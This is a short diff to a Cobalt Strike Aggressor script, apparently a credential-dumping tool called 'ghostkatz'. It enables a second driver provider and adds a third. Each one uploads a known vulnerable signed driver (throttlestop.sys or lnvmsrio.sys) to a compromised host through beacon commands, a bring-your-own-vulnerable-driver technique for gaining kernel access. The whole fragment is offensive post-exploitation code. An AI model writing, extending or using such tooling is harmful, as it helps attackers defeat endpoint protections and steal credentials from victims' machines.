@@ -49,11 +49,15 @@ alias ghostkatz {
 	}
 	else if ($providerNum == 2)
 	{
-		#$drvFile = script_resource("drivers/throttlestop.sys");
-		#bcd($1, $drvBasePath);
-		#bupload($1, $drvFile);
-		berror($1, "Provider $providerNum not implemented..");
-		return;
+		$drvFile = script_resource("drivers/throttlestop.sys");
+		bcd($1, $drvBasePath);
+		bupload($1, $drvFile);
+	}
+	else if ($providerNum == 3)
+	{
+		$drvFile = script_resource("drivers/lnvmsrio.sys");
+		bcd($1, $drvBasePath);
+		bupload($1, $drvFile);
 	}
 	else if ($providerNum is $null)
 	{
